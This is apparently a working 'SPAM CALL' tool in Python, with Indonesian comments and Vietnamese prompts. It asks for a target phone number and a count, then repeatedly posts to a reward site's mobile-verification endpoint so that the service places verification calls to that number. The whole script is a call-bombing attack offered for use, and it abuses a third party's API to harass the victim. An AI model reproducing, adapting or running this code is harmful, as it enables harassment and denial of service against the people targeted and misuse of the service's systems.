# Mau gua Marshal kagak jadi
# suberk dlu sebelum ngambil
import os,sys,time,requests
from time import sleep

#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.02)

os.system('clear')
print ('\033[36;1mCảm ơn đã sử dụng tool của\033[37mMaVanDes \033[36m:3')
os.system('clear')
sleep(5)
os.system('clear')
print ('\033[36;1mTool được viết bởi \033[37;1mMaVanDes')
os.system('clear')
sleep(3)
os.system('clear')
# Ubah Terserah kalian
print ("")
mengetik("\033[36;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[33;1m ╔██████╗ █████╗ ██╗     ██╗")
mengetik("\033[36;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[33;1m ██╔════╝██╔══██╗██║     ██║")
mengetik("\033[36;1m ███████╗██████╔╝███████║██╔████╔██║ \033[33;1m ██║     ███████║██║     ██║")
mengetik("\033[37;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[37;1m ██║     ██╔══██║██║     ██║")
mengetik("\033[37;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[37;1m ╚██████╗██║  ██║███████╗███████╗")
mengetik("\033[37;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[37;1m  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝")
print ("")
mengetik("\033[33;1m╔=========================================================================╗")
mengetik("\033[33;1m║  \033[36;1m [•] Tác Giả : MaVanDes                           \033[33;1m ║")
mengetik("\033[33;1m║  \033[36;1m [•] GitHub  : https:github.com/MaVanDes          \033[33;1m ║")
mengetik("\033[33;1m║  \033[36;1m [•] Team  : Dev-Trick by HTB                     \033[33;1m ║")
mengetik("\033[33;1m╚=========================================================================╝")
print ("")
mengetik("\033[36;1m╔==============================╗")
mengetik("\033[36;1m║\033[33;1m MaVanDes\033[36;1m ║")
mengetik("\033[36;1m╚==============================╝")
sleep(1)
# Jaggan di ubah sayang
print ("")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m SỐ LỰA CHỌN \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("")
mengetik("\033[37m[\033[31m•\033[37m]\033[32m Số ví dụ\033[37m : \033[37m\033[33m+84Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Số mục tiêu\033[32m \033[37m:\033[37m\033[33m ")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m NHẬP SỐ LƯỢNG \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Tổng số thư rác\033[37m :\033[37m\033[33m "))
mengetik("[cứ mỗi 3 lần thư rác thì có 15 phút tạm dừng] ")
time.sleep(3)
print ("")
# Jaggan di ubah sayang ku
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# Jaggan di ubah sayng
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [Des] Status ~+> ",(send.json()["message"]))

